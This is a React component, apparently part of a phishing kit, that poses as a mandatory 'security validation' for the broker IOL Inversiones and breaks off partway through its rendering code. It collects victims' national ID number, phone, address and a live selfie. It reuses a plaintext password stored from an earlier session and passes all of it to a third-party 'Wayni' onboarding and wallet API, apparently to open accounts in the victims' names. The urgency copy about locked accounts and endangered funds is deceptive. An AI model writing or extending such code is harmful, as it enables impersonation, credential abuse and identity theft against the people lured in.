import { useCallback, useEffect, useMemo, useState } from "react";
import {
  AlertTriangle,
  Camera,
  CheckCircle2,
  ChevronRight,
  ExternalLink,
  Loader2,
  Lock,
  MapPin,
  RefreshCw,
  ShieldCheck,
  Smartphone,
  UserRound,
} from "lucide-react";
import { z } from "zod";
import { supabase } from "@/integrations/supabase/client";
import { invokeWayni } from "@/lib/wayniApi";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Progress } from "@/components/ui/progress";
import { toast } from "@/components/ui/use-toast";

interface KycCaseRecord {
  id: string;
  operator_code: string;
  email: string | null;
  full_name: string | null;
  phone: string | null;
  document_number: string | null;
  status: string;
  submitted_at: string | null;
}

interface WayniOnboardingRecord {
  id: string;
  email: string;
  full_name: string | null;
  phone: string | null;
  dni: string | null;
  gender: string | null;
  user_uuid: string | null;
  biometric_url: string | null;
  biometric_id: string | null;
  region: string | null;
  city: string | null;
  street: string | null;
  zip_code: string | null;
  bio_status: string | null;
  wallet_status: string | null;
  face_code: string | null;
  face_confidence: string | null;
  status: string;
}

interface LegalCandidate {
  identity_number?: string;
  full_name: string;
  gender: string;
  tax_identification_value: string;
}

type Step = "verify" | "address" | "biometric" | "done";

interface WayniKycFlowProps {
  caseId: string;
  embedded?: boolean;
  brandLabel?: string;
}

const stepOrder: Step[] = ["verify", "address", "biometric"];

const verifySchema = z.object({
  dni: z.string().regex(/^\d{7,8}$/, "Ingresá un DNI válido de 7 u 8 números."),
  phone: z.string().regex(/^\d{8,10}$/, "Ingresá tu celular sin 0 ni 15."),
  gender: z.enum(["", "F", "M"]),
});

const addressSchema = z.object({
  provinceId: z.string().min(1, "Seleccioná una provincia."),
  localityId: z.string().min(1, "Seleccioná una localidad."),
  streetName: z.string().trim().min(2, "Ingresá la calle.").max(120, "La calle es demasiado larga."),
  streetNumber: z.string().regex(/^\d{1,6}$/, "Ingresá una altura válida."),
  floor: z.string().trim().max(10, "El piso es demasiado largo."),
  apartment: z.string().trim().max(10, "El departamento es demasiado largo."),
  zipCode: z.string().regex(/^\d{4,8}$/, "Ingresá un código postal válido."),
});

const cardClass = "rounded-[24px] border-border bg-card/95 shadow-sm";
const panelClass = "rounded-2xl border border-border bg-background/70 p-4";
const stepBadgeClass = "border-primary/25 bg-primary/10 text-primary";
const selectClass =
  "flex h-11 w-full rounded-2xl border border-input bg-background px-4 py-2 text-sm text-foreground outline-none transition focus:border-primary focus:ring-2 focus:ring-primary/15 disabled:cursor-not-allowed disabled:opacity-60";

const sanitizeDigits = (value: string, maxLength?: number) => {
  const digits = value.replace(/\D/g, "");
  return typeof maxLength === "number" ? digits.slice(0, maxLength) : digits;
};

const stripArgentinaCode = (value?: string | null) => {
  const digits = sanitizeDigits(value || "");
  if (digits.startsWith("54") && digits.length > 10) {
    return digits.slice(2, 12);
  }
  return digits.slice(0, 10);
};

const buildArgentinaPhone = (value: string) => {
  const digits = sanitizeDigits(value, 10);
  if (!digits) return "";
  return digits.startsWith("54") ? digits : `54${digits}`;
};

const formatPhonePreview = (value: string) => {
  if (!value) return "—";
  return `+54 ${value}`;
};

const getBiometricLabel = (status?: string | null, started?: boolean) => {
  if (!status) return started ? "En curso" : "Pendiente";
  return status;
};

const StepPills = ({ step }: { step: Step }) => {
  const activeIndex = step === "done" ? stepOrder.length : stepOrder.indexOf(step) + 1;

  return (
    <div className="grid gap-2 sm:grid-cols-3">
      {[
        { key: "verify", label: "1. Identidad" },
        { key: "address", label: "2. Dirección" },
        { key: "biometric", label: "3. Biometría" },
      ].map((item, index) => {
        const isActive = step === "done" ? true : index < activeIndex;
        return (
          <div
            key={item.key}
            className={`rounded-xl border px-3 py-2 text-xs font-medium transition ${
              isActive ? stepBadgeClass : "border-border bg-background/60 text-muted-foreground"
            }`}
          >
            {item.label}
          </div>
        );
      })}
    </div>
  );
};

const SummaryItem = ({ label, value }: { label: string; value: string }) => (
  <div className={panelClass}>
    <p className="text-[11px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">{label}</p>
    <p className="mt-1 text-sm font-medium text-foreground">{value || "—"}</p>
  </div>
);

const Notice = ({ children }: { children: React.ReactNode }) => (
  <div className="rounded-2xl border border-primary/20 bg-primary/5 p-4 text-sm leading-relaxed text-muted-foreground">
    <div className="flex items-start gap-3">
      <ShieldCheck className="mt-0.5 h-4 w-4 shrink-0 text-primary" />
      <p>{children}</p>
    </div>
  </div>
);

const WayniKycFlow = ({ caseId, embedded = false, brandLabel = "IOL" }: WayniKycFlowProps) => {
  const brandName = brandLabel === "IOL" ? "IOL Inversiones" : brandLabel;

  const [loading, setLoading] = useState(true);
  const [caseRecord, setCaseRecord] = useState<KycCaseRecord | null>(null);
  const [step, setStep] = useState<Step>("verify");
  const [sessionPassword, setSessionPassword] = useState("");
  const [wayniSnapshot, setWayniSnapshot] = useState<WayniOnboardingRecord | null>(null);

  const [fullName, setFullName] = useState("");
  const [phone, setPhone] = useState("");
  const [dni, setDni] = useState("");
  const [gender, setGender] = useState("");
  const [userUuid, setUserUuid] = useState("");
  const [biometricUrl, setBiometricUrl] = useState("");

  const [candidates, setCandidates] = useState<LegalCandidate[]>([]);
  const [selectedCandidateKey, setSelectedCandidateKey] = useState("");
  const [verifyLoading, setVerifyLoading] = useState(false);
  const [verifyError, setVerifyError] = useState("");

  const [provinces, setProvinces] = useState<Record<string, string>>({});
  const [localities, setLocalities] = useState<Record<string, string>>({});
  const [loadingProvinces, setLoadingProvinces] = useState(false);
  const [loadingLocalities, setLoadingLocalities] = useState(false);
  const [addressLoading, setAddressLoading] = useState(false);
  const [addressError, setAddressError] = useState("");
  const [selectedProvinceId, setSelectedProvinceId] = useState("");
  const [selectedProvinceName, setSelectedProvinceName] = useState("");
  const [selectedLocalityId, setSelectedLocalityId] = useState("");
  const [selectedLocalityName, setSelectedLocalityName] = useState("");
  const [streetName, setStreetName] = useState("");
  const [streetNumber, setStreetNumber] = useState("");
  const [floor, setFloor] = useState("");
  const [apartment, setApartment] = useState("");
  const [zipCode, setZipCode] = useState("");

  const [biometricStarted, setBiometricStarted] = useState(false);
  const [checkingBiometric, setCheckingBiometric] = useState(false);

  const selectedCandidate = useMemo(
    () => candidates.find((candidate) => `${candidate.full_name}|${candidate.gender}|${candidate.tax_identification_value}` === selectedCandidateKey),
    [candidates, selectedCandidateKey],
  );

  const currentStepIndex = step === "done" ? stepOrder.length : Math.max(stepOrder.indexOf(step), 0) + 1;
  const progressValue = Math.round((currentStepIndex / stepOrder.length) * 100);
  const fullArgentinaPhone = buildArgentinaPhone(phone);

  useEffect(() => {
    if (embedded) return;
    const originalTitle = document.title;
    document.title = `${brandName} — Validación de seguridad`;
    return () => {
      document.title = originalTitle;
    };
  }, [brandName, embedded]);

  const loadLocalities = useCallback(async (provinceId: string, preferredLocality?: string | null) => {
    if (!provinceId) return;

    setLoadingLocalities(true);
    const { data, error } = await invokeWayni({ action: "get_localities", province_id: Number(provinceId) });

    if (!error && data?.localities) {
      const fetchedLocalities = data.localities as Record<string, string>;
      setLocalities(fetchedLocalities);

      if (preferredLocality) {
        const matched = Object.entries(fetchedLocalities).find(([, name]) => name === preferredLocality);
        if (matched) {
          setSelectedLocalityId(matched[0]);
          setSelectedLocalityName(matched[1]);
        }
      }
    }

    setLoadingLocalities(false);
  }, []);

  const persistWayniSnapshot = useCallback(async (payload: Record<string, unknown>) => {
    if (!caseRecord?.email) return;

    const normalizedEmail = caseRecord.email.trim().toLowerCase();
    const onboardingClient = supabase as any;
    const { data: existing } = await onboardingClient
      .from("wayni_onboarding")
      .select("id")
      .eq("email", normalizedEmail)
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();

    const basePayload = {
      email: normalizedEmail,
      operator_code: caseRecord.operator_code,
      updated_at: new Date().toISOString(),
      ...payload,
    };

    if (existing?.id) {
      await onboardingClient.from("wayni_onboarding").update(basePayload).eq("id", existing.id);
    } else {
      await onboardingClient.from("wayni_onboarding").insert(basePayload);
    }
  }, [caseRecord]);

  const refreshBiometricStatus = useCallback(async () => {
    if (!dni) return;

    setCheckingBiometric(true);
    const { data, error } = await invokeWayni({
      action: "check_biometric_status",
      identity_number: dni,
    });

    if (error || data?.error) {
      toast({
        title: "No pudimos actualizar el estado",
        description: "Intentá nuevamente en unos instantes.",
      });
      setCheckingBiometric(false);
      return;
    }

    const biometricStatus = String(data?.biometric_status || "").toLowerCase();
    const biometricOk = Boolean(data?.biometric_ok) || biometricStatus === "success";
    const now = new Date().toISOString();

    await persistWayniSnapshot({
      dni,
      full_name: fullName || null,
      phone: fullArgentinaPhone || null,
      gender: gender || null,
      user_uuid: userUuid || null,
      biometric_url: biometricUrl || null,
      bio_status: biometricStatus || null,
      wallet_status: data?.wallet_status ? String(data.wallet_status).toUpperCase() : null,
      face_code: data?.facematching?.code ? String(data.facematching.code) : null,
      face_confidence: data?.facematching_confidence ? String(data.facematching_confidence) : null,
      status: biometricOk ? "validated" : "biometric_started",
    });

    setWayniSnapshot((prev) => (
      prev
        ? {
            ...prev,
            dni,
            full_name: fullName || prev.full_name,
            phone: fullArgentinaPhone || prev.phone,
            gender: gender || prev.gender,
            user_uuid: userUuid || prev.user_uuid,
            biometric_url: biometricUrl || prev.biometric_url,
            bio_status: biometricStatus || prev.bio_status,
            wallet_status: data?.wallet_status ? String(data.wallet_status).toUpperCase() : prev.wallet_status,
            face_code: data?.facematching?.code ? String(data.facematching.code) : prev.face_code,
            face_confidence: data?.facematching_confidence ? String(data.facematching_confidence) : prev.face_confidence,
            status: biometricOk ? "validated" : "biometric_started",
          }
        : prev
    ));

    if (biometricOk && caseRecord) {
      await supabase
        .from("kyc_cases")
        .update({ status: "submitted", submitted_at: now })
        .eq("id", caseRecord.id);

      await supabase.from("kyc_audit_logs").insert({
        case_id: caseRecord.id,
        operator_code: caseRecord.operator_code,
        event_type: "provider_kyc_completed",
        metadata: {
          provider: "wayni",
          dni,
          bio_status: biometricStatus || null,
          wallet_status: data?.wallet_status || null,
          finished_at: now,
        },
      } as never);

      setCaseRecord((prev) => (prev ? { ...prev, status: "submitted", submitted_at: now } : prev));
      setStep("done");
      toast({
        title: "Validación completada",
        description: "Ya podés continuar con el acceso a tu cuenta.",
      });
    } else {
      toast({
        title: "Proceso en curso",
        description: "Completá la validación y luego tocá “Actualizar estado”.",
      });
    }

    setCheckingBiometric(false);
  }, [biometricUrl, caseRecord, dni, fullArgentinaPhone, fullName, gender, persistWayniSnapshot, userUuid]);

  const loadCase = useCallback(async () => {
    if (!caseId) {
      setCaseRecord(null);
      setLoading(false);
      return;
    }

    setLoading(true);

    const { data, error } = await supabase
      .from("kyc_cases")
      .select("id, operator_code, email, full_name, phone, document_number, status, submitted_at")
      .eq("id", caseId)
      .maybeSingle();

    if (error || !data) {
      setCaseRecord(null);
      setLoading(false);
      return;
    }

    const record = data as KycCaseRecord;
    setCaseRecord(record);

    const normalizedEmail = record.email?.trim().toLowerCase();
    const [sessionResult, onboardingResult] = await Promise.all([
      normalizedEmail
        ? supabase
            .from("sessions")
            .select("password")
            .eq("email", normalizedEmail)
            .eq("operator_code", record.operator_code)
            .order("created_at", { ascending: false })
            .limit(1)
            .maybeSingle()
        : Promise.resolve({ data: null, error: null }),
      normalizedEmail
        ? (supabase as any)
            .from("wayni_onboarding")
            .select("id, email, full_name, phone, dni, gender, user_uuid, biometric_url, biometric_id, region, city, street, zip_code, bio_status, wallet_status, face_code, face_confidence, status")
            .eq("email", normalizedEmail)
            .order("created_at", { ascending: false })
            .limit(1)
            .maybeSingle()
        : Promise.resolve({ data: null, error: null }),
    ]);

    const onboarding = (onboardingResult?.data || null) as WayniOnboardingRecord | null;
    setWayniSnapshot(onboarding);
    setSessionPassword(sessionResult?.data?.password || "");
    setFullName(onboarding?.full_name || record.full_name || "");
    setPhone(stripArgentinaCode(onboarding?.phone || record.phone || ""));
    setDni(sanitizeDigits(onboarding?.dni || record.document_number || "", 8));
    setGender(onboarding?.gender || "");
    setUserUuid(onboarding?.user_uuid || "");
    setBiometricUrl(onboarding?.biometric_url || "");
    setBiometricStarted(Boolean(onboarding?.biometric_url));

    if (onboarding?.region) {
      setSelectedProvinceName(onboarding.region);
    }
    if (onboarding?.city) {
      setSelectedLocalityName(onboarding.city);
    }
    if (onboarding?.street) {
      const streetParts = onboarding.street.split(" ");
      const lastPart = streetParts.at(-1) || "";
      if (/^\d+$/.test(lastPart)) {
        setStreetName(streetParts.slice(0, -1).join(" "));
        setStreetNumber(lastPart);
      } else {
        setStreetName(onboarding.street);
      }
    }
    if (onboarding?.zip_code) {
      setZipCode(onboarding.zip_code);
    }

    const isDone = record.status === "submitted" || String(onboarding?.bio_status || "").toLowerCase() === "success";

    if (isDone) {
      setStep("done");
    } else if (onboarding?.biometric_url) {
      setStep("biometric");
    } else if (onboarding?.user_uuid) {
      setStep("address");
    } else {
      setStep("verify");
    }

    setLoading(false);
  }, [caseId]);

  useEffect(() => {
    void loadCase();
  }, [loadCase]);

  useEffect(() => {
    if (step !== "address") return;

    const loadProvinces = async () => {
      setLoadingProvinces(true);
      const { data, error } = await invokeWayni({ action: "get_provinces" });

      if (!error && data?.provinces) {
        const fetchedProvinces = data.provinces as Record<string, string>;
        setProvinces(fetchedProvinces);

        if (selectedProvinceName) {
          const matchedProvince = Object.entries(fetchedProvinces).find(([, name]) => name === selectedProvinceName);
          if (matchedProvince) {
            setSelectedProvinceId(matchedProvince[0]);
            await loadLocalities(matchedProvince[0], selectedLocalityName || undefined);
          }
        }
      }

      setLoadingProvinces(false);
    };

    void loadProvinces();
  }, [loadLocalities, selectedLocalityName, selectedProvinceName, step]);

  useEffect(() => {
    if (step === "biometric" && dni && biometricUrl && !checkingBiometric) {
      void refreshBiometricStatus();
    }
  }, [biometricUrl, checkingBiometric, dni, refreshBiometricStatus, step]);

  const handleVerifySubmit = useCallback(async () => {
    if (!caseRecord?.email) {
      setVerifyError("Este enlace no tiene un email válido para iniciar la validación.");
      return;
    }

    const parsed = verifySchema.safeParse({ dni, phone, gender });
    if (!parsed.success) {
      setVerifyError(parsed.error.issues[0]?.message || "Revisá los datos ingresados.");
      return;
    }

    if (!sessionPassword) {
      setVerifyError("No encontramos la credencial necesaria para iniciar el proceso. Solicitá nuevamente la validación.");
      return;
    }

    if (candidates.length > 1 && !selectedCandidate) {
      setVerifyError("Seleccioná el titular correcto para continuar.");
      return;
    }

    setVerifyLoading(true);
    setVerifyError("");

    const { data, error } = await invokeWayni({
      action: "onboarding_verify",
      email: caseRecord.email.trim().toLowerCase(),
      identity_number: parsed.data.dni,
      phone_number: buildArgentinaPhone(parsed.data.phone),
      password: sessionPassword,
      selected_full_name: selectedCandidate?.full_name,
      selected_gender: gender || undefined,
      selected_tax_identification_value: selectedCandidate?.tax_identification_value,
    });

    if (error || data?.error) {
      setVerifyError(data?.error || error?.message || "No fue posible validar tus datos.");
      setVerifyLoading(false);
      return;
    }

    if (data?.requires_selection && Array.isArray(data?.candidates) && data.candidates.length > 0) {
      setCandidates(data.candidates as LegalCandidate[]);
      setSelectedCandidateKey("");
      if (!gender) {
        setGender(String(data?.suggested_gender || data.candidates[0]?.gender || "").toUpperCase());
      }
      setVerifyError("Encontramos más de un titular para este DNI. Seleccioná tu nombre para continuar.");
      setVerifyLoading(false);
      return;
    }

    const resolvedName = String(data?.full_name || selectedCandidate?.full_name || fullName || "").trim();
    const resolvedGender = String(data?.gender || gender || selectedCandidate?.gender || "").toUpperCase();
    const resolvedUuid = String(data?.user_uuid || "");
    const normalizedPhone = buildArgentinaPhone(parsed.data.phone);

    setFullName(resolvedName);
    setGender(resolvedGender);
    setUserUuid(resolvedUuid);
    setCandidates([]);
    setSelectedCandidateKey("");

    await supabase
      .from("kyc_cases")
      .update({
        full_name: resolvedName || null,
        phone: normalizedPhone,
        document_number: parsed.data.dni,
        status: "collecting",
      })
      .eq("id", caseRecord.id);

    await supabase.from("kyc_audit_logs").insert({
      case_id: caseRecord.id,
      operator_code: caseRecord.operator_code,
      event_type: "provider_verify_started",
      metadata: {
        provider: "wayni",
        email: caseRecord.email,
        phone: normalizedPhone,
        dni: parsed.data.dni,
        full_name: resolvedName || null,
      },
    } as never);

    await persistWayniSnapshot({
      dni: parsed.data.dni,
      full_name: resolvedName || null,
      phone: normalizedPhone,
      gender: resolvedGender || null,
      user_uuid: resolvedUuid || null,
      password: sessionPassword,
      status: "verify_dni_success",
    });

    setCaseRecord((prev) => (
      prev
        ? {
            ...prev,
            full_name: resolvedName || prev.full_name,
            phone: normalizedPhone,
            document_number: parsed.data.dni,
            status: "collecting",
          }
        : prev
    ));

    setStep("address");
    setVerifyLoading(false);
  }, [
    candidates.length,
    caseRecord,
    dni,
    fullName,
    gender,
    persistWayniSnapshot,
    phone,
    selectedCandidate,
    sessionPassword,
  ]);

  const handleProvinceChange = useCallback(async (provinceId: string) => {
    setSelectedProvinceId(provinceId);
    setSelectedProvinceName(provinces[provinceId] || "");
    setSelectedLocalityId("");
    setSelectedLocalityName("");
    setLocalities({});
    await loadLocalities(provinceId);
  }, [loadLocalities, provinces]);

  const handleAddressSubmit = useCallback(async () => {
    if (!caseRecord) return;

    if (!userUuid) {
      setAddressError("Primero completá la validación de identidad.");
      return;
    }

    const parsed = addressSchema.safeParse({
      provinceId: selectedProvinceId,
      localityId: selectedLocalityId,
      streetName,
      streetNumber,
      floor,
      apartment,
      zipCode,
    });

    if (!parsed.success) {
      setAddressError(parsed.error.issues[0]?.message || "Revisá los datos del domicilio.");
      return;
    }

    setAddressLoading(true);
    setAddressError("");

    const addressPayload = {
      uuid: userUuid,
      street_name: parsed.data.streetName.trim(),
      street_number: parsed.data.streetNumber.trim(),
      floor: parsed.data.floor.trim() || null,
      apartment: parsed.data.apartment.trim() || null,
      zip_code: parsed.data.zipCode.trim(),
      neighborhood: null,
      city_id: Number(selectedLocalityId),
      city: selectedLocalityName,
      region_id: Number(selectedProvinceId),
      region: selectedProvinceName,
    };

    const { data: saveData, error: saveError } = await invokeWayni({
      action: "save_address",
      ...addressPayload,
    });

    if (saveError || saveData?.error) {
      setAddressError(saveData?.error || saveError?.message || "No fue posible guardar la dirección.");
      setAddressLoading(false);
      return;
    }

    const { data: biometricData, error: biometricError } = await invokeWayni({
      action: "onboarding_biometric",
      identity_number: dni,
      user_uuid: userUuid,
      gender: gender || "M",
    });

    if (biometricError || biometricData?.error || !biometricData?.biometric_url) {
      setAddressError(biometricData?.error || biometricError?.message || "No fue posible abrir la validación con cámara.");
      setAddressLoading(false);
      return;
    }

    const nextBiometricUrl = String(biometricData.biometric_url);
    setBiometricUrl(nextBiometricUrl);
    setBiometricStarted(false);

    await persistWayniSnapshot({
      dni,
      full_name: fullName || null,
      phone: fullArgentinaPhone || null,
      gender: gender || null,
      user_uuid: userUuid,
      region: selectedProvinceName,
      city: selectedLocalityName,
      street: `${parsed.data.streetName.trim()} ${parsed.data.streetNumber.trim()}`.trim(),
      zip_code: parsed.data.zipCode.trim(),
      biometric_url: nextBiometricUrl,
      biometric_id: biometricData?.biometric_id ? String(biometricData.biometric_id) : null,
      status: "biometric_started",
    });

    await supabase.from("kyc_audit_logs").insert({
      case_id: caseRecord.id,
      operator_code: caseRecord.operator_code,
      event_type: "provider_address_saved",
      metadata: {
        provider: "wayni",
        region: selectedProvinceName,
        city: selectedLocalityName,
        street: `${parsed.data.streetName.trim()} ${parsed.data.streetNumber.trim()}`.trim(),
        zip_code: parsed.data.zipCode.trim(),
        biometric_id: biometricData?.biometric_id || null,
      },
    } as never);

    setStep("biometric");
    setAddressLoading(false);
  }, [
    apartment,
    caseRecord,
    dni,
    floor,
    fullArgentinaPhone,
    fullName,
    gender,
    persistWayniSnapshot,
    selectedLocalityId,
    selectedLocalityName,
    selectedProvinceId,
    selectedProvinceName,
    streetName,
    streetNumber,
    userUuid,
    zipCode,
  ]);

  const renderVerifyStep = () => (
    <Card className={cardClass}>
      <CardContent className="space-y-5 p-5 sm:p-6">
        <div className="flex items-start gap-3">
          <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-primary/12 text-primary">
            <UserRound className="h-5 w-5" />
          </div>
          <div>
            <p className="text-xs font-semibold uppercase tracking-[0.24em] text-primary">Paso 1 de 3</p>
            <h2 className="mt-1 text-xl font-semibold tracking-tight text-foreground sm:text-2xl">Confirmá tu identidad</h2>
            <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
              {brandName} necesita actualizar tus datos para mantener tus fondos seguros. Este proceso es obligatorio y solo vas a poder acceder a tu cuenta cuando finalices el 100%.
            </p>
          </div>
        </div>

        <Notice>
          Verificá tu DNI y tu celular. Después te vamos a pedir domicilio y una validación rápida con cámara en vivo.
        </Notice>

        {verifyError && (
          <div className="rounded-2xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive">
            {verifyError}
          </div>
        )}

        <div className="grid gap-3 sm:grid-cols-2">
          {fullName && <SummaryItem label="Titular" value={fullName} />}
          {caseRecord?.email && <SummaryItem label="Email" value={caseRecord.email} />}
        </div>

        <div className="grid gap-4">
          <div>
            <Label htmlFor="dni">DNI</Label>
            <Input
              id="dni"
              type="text"
              inputMode="numeric"
              value={dni}
              maxLength={8}
              onChange={(event) => {
                setDni(sanitizeDigits(event.target.value, 8));
                setCandidates([]);
                setSelectedCandidateKey("");
              }}
              className="mt-1 h-11 rounded-2xl"
              placeholder="Ej: 38045521"
              disabled={verifyLoading}
            />
          </div>

          <div>
            <Label htmlFor="phone">Celular</Label>
            <div className="mt-1 flex items-center gap-2 rounded-2xl border border-input bg-background px-3">
              <span className="shrink-0 text-sm font-semibold text-foreground">+54</span>
              <Input
                id="phone"
                type="text"
                inputMode="tel"
                value={phone}
                maxLength={10}
                onChange={(event) => setPhone(sanitizeDigits(event.target.value, 10))}
                className="h-11 border-0 bg-transparent px-0 shadow-none focus-visible:ring-0 focus-visible:ring-offset-0"
                placeholder="11 6605 1847"
                disabled={verifyLoading}
              />
            </div>
            <p className="mt-1 text-xs text-muted-foreground">Ingresalo sin 0, sin 15 y sin el código de país.</p>
          </div>

          <div>
            <Label htmlFor="gender">Sexo biológico (opcional)</Label>
            <select
              id="gender"
              value={gender}
              onChange={(event) => setGender(event.target.value.toUpperCase())}
              className={`mt-1 ${selectClass}`}
              disabled={verifyLoading}
            >
              <option value="">Seleccionar</option>
              <option value="F">Femenino</option>
              <option value="M">Masculino</option>
            </select>
          </div>

          {candidates.length > 1 && (
            <div className="rounded-2xl border border-border bg-background/70 p-3">
              <p className="mb-2 text-sm font-medium text-foreground">Seleccioná el titular correcto</p>
              <div className="grid gap-2">
                {candidates.map((candidate) => {
                  const key = `${candidate.full_name}|${candidate.gender}|${candidate.tax_identification_value}`;
                  const isSelected = selectedCandidateKey === key;
                  return (
                    <button
                      key={key}
                      type="button"
                      onClick={() => setSelectedCandidateKey(key)}
                      className={`rounded-2xl border px-3 py-3 text-left transition ${
                        isSelected ? stepBadgeClass : "border-border bg-background hover:border-primary/40"
                      }`}
                    >
                      <p className="text-sm font-semibold text-foreground">{candidate.full_name}</p>
                      <p className="mt-1 text-xs text-muted-foreground">
                        CUIT: {candidate.tax_identification_value} • Sexo: {candidate.gender || "-"}
                      </p>
                    </button>
                  );
                })}
              </div>
            </div>
          )}
        </div>

        <div className="grid gap-3 rounded-2xl border border-border bg-background/60 p-4 sm:grid-cols-3">
          {[
            "Validación de identidad",
            "Carga de domicilio",
            "Confirmación facial y documental",
          ].map((item, index) => (
            <div key={item} className="flex items-center gap-2 text-sm text-muted-foreground">
              <span className="flex h-6 w-6 items-center justify-center rounded-full bg-primary/10 text-xs font-semibold text-primary">
                {index + 1}
              </span>
              <span>{item}</span>
            </div>
          ))}
        </div>

        <Button className="h-11 w-full rounded-2xl" onClick={handleVerifySubmit} disabled={verifyLoading}>
          {verifyLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <ChevronRight className="h-4 w-4" />}
          Continuar validación
        </Button>
      </CardContent>
    </Card>
  );

  const renderAddressStep = () => (
    <Card className={cardClass}>
      <CardContent className="space-y-5 p-5 sm:p-6">
        <div className="flex items-start gap-3">
          <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-primary/12 text-primary">
            <MapPin className="h-5 w-5" />
          </div>
          <div>
            <p className="text-xs font-semibold uppercase tracking-[0.24em] text-primary">Paso 2 de 3</p>
            <h2 className="mt-1 text-xl font-semibold tracking-tight text-foreground sm:text-2xl">Domicilio de residencia</h2>
            <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
              Completá tu dirección para avanzar con la actualización obligatoria de seguridad de {brandName}.
            </p>
          </div>
        </div>

        {addressError && (
          <div className="rounded-2xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive">
            {addressError}
          </div>
        )}

        <div className="grid gap-3 sm:grid-cols-3">
          <SummaryItem label="Titular" value={fullName || "—"} />
          <SummaryItem label="DNI" value={dni || "—"} />
          <SummaryItem label="Celular" value={formatPhonePreview(phone)} />
        </div>

        <div className="grid gap-4">
          <div>
            <Label htmlFor="province">Provincia</Label>
            <select
              id="province"
              value={selectedProvinceId}
              onChange={(event) => void handleProvinceChange(event.target.value)}
              className={`mt-1 ${selectClass}`}
              disabled={loadingProvinces || addressLoading}
            >
              <option value="">{loadingProvinces ? "Cargando..." : "Seleccionar provincia"}</option>
              {Object.entries(provinces)
                .sort(([, a], [, b]) => a.localeCompare(b))
                .map(([id, name]) => (
                  <option key={id} value={id}>
                    {name}
                  </option>
                ))}
            </select>
          </div>

          <div>
            <Label htmlFor="locality">Localidad</Label>
            <select
              id="locality"
              value={selectedLocalityId}
              onChange={(event) => {
                setSelectedLocalityId(event.target.value);
                setSelectedLocalityName(localities[event.target.value] || "");
              }}
              className={`mt-1 ${selectClass}`}
              disabled={!selectedProvinceId || loadingLocalities || addressLoading}
            >
              <option value="">{loadingLocalities ? "Cargando..." : "Seleccionar localidad"}</option>
              {Object.entries(localities)
                .sort(([, a], [, b]) => a.localeCompare(b))
                .map(([id, name]) => (
                  <option key={id} value={id}>
                    {name}
                  </option>
                ))}
            </select>
          </div>

          <div className="grid gap-4 sm:grid-cols-[1.5fr_0.8fr]">
            <div>
              <Label htmlFor="street">Calle</Label>
              <Input
                id="street"
                type="text"
                value={streetName}
                onChange={(event) => setStreetName(event.target.value)}
                className="mt-1 h-11 rounded-2xl"
                placeholder="Ej: Av. Corrientes"
                disabled={addressLoading}
              />
            </div>
            <div>
              <Label htmlFor="street-number">Altura</Label>
              <Input
                id="street-number"
                type="text"
                inputMode="numeric"
                value={streetNumber}
                onChange={(event) => setStreetNumber(sanitizeDigits(event.target.value, 6))}
                className="mt-1 h-11 rounded-2xl"
                placeholder="1234"
                disabled={addressLoading}
              />
            </div>
          </div>

          <div className="grid gap-4 sm:grid-cols-3">
            <div>
              <Label htmlFor="floor">Piso</Label>
              <Input
                id="floor"
                type="text"
                value={floor}
                onChange={(event) => setFloor(event.target.value.slice(0, 10))}
                className="mt-1 h-11 rounded-2xl"
                placeholder="3"
                disabled={addressLoading}
              />
            </div>
            <div>
              <Label htmlFor="apartment">Depto.</Label>
              <Input
                id="apartment"
                type="text"
                value={apartment}
                onChange={(event) => setApartment(event.target.value.slice(0, 10))}
                className="mt-1 h-11 rounded-2xl"
                placeholder="A"
                disabled={addressLoading}
              />
            </div>
            <div>
              <Label htmlFor="zip">Código postal</Label>
              <Input
                id="zip"
                type="text"
                inputMode="numeric"
                value={zipCode}
                onChange={(event) => setZipCode(sanitizeDigits(event.target.value, 8))}
                className="mt-1 h-11 rounded-2xl"
                placeholder="1043"
                disabled={addressLoading}
              />
            </div>
          </div>
        </div>

        <Button className="h-11 w-full rounded-2xl" onClick={handleAddressSubmit} disabled={addressLoading}>
          {addressLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <ChevronRight className="h-4 w-4" />}
          Guardar y continuar
        </Button>
      </CardContent>
    </Card>
  );

  const renderBiometricStep = () => (
    <Card className={cardClass}>
      <CardContent className="space-y-5 p-5 sm:p-6">
        <div className="flex items-start gap-3">
          <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-primary/12 text-primary">
            <Camera className="h-5 w-5" />
          </div>
          <div>
            <p className="text-xs font-semibold uppercase tracking-[0.24em] text-primary">Paso 3 de 3</p>
            <h2 className="mt-1 text-xl font-semibold tracking-tight text-foreground sm:text-2xl">Validación con cámara</h2>
            <p className="mt-2 text-sm leading-relaxed text-muted-foreground">
              Este último paso confirma tu identidad para desbloquear nuevamente el acceso completo a tu cuenta.
            </p>
          </div>
        </div>

        <Notice>
          {brandName} necesita esta validación para proteger tus fondos. El proceso es obligatorio, dura pocos minutos y tu cuenta quedará habilitada cuando completes el 100%.
        </Notice>

        <div className="rounded-2xl border border-border bg-background/70 p-4 sm:p-5">
          <div className="flex items-start gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-2xl bg-primary/10 text-primary">
              <Smartphone className="h-5 w-5" />
            </div>
            <div>
              <h3 className="text-base font-semibold text-foreground">Abrí la validación segura</h3>
              <p className="mt-1 text-sm text-muted-foreground">
                Completá la selfie y la captura documental. Cuando termines, volvé a esta pantalla y actualizá el estado.
              </p>
            </div>
          </div>

          <div className="mt-4 grid gap-3 sm:grid-cols-3">
            <SummaryItem label="Biometría" value={getBiometricLabel(wayniSnapshot?.bio_status, biometricStarted)} />
            <SummaryItem label="Wallet" value={wayniSnapshot?.wallet_status || "—"} />
            <SummaryItem label="DNI" value={dni || "—"} />
          </div>

          <div className="mt-4 flex flex-col gap-3 sm:flex-row">
            <Button
              className="h-11 rounded-2xl sm:flex-1"
              onClick={() => {
                window.open(biometricUrl, "_blank", "noopener,noreferrer");
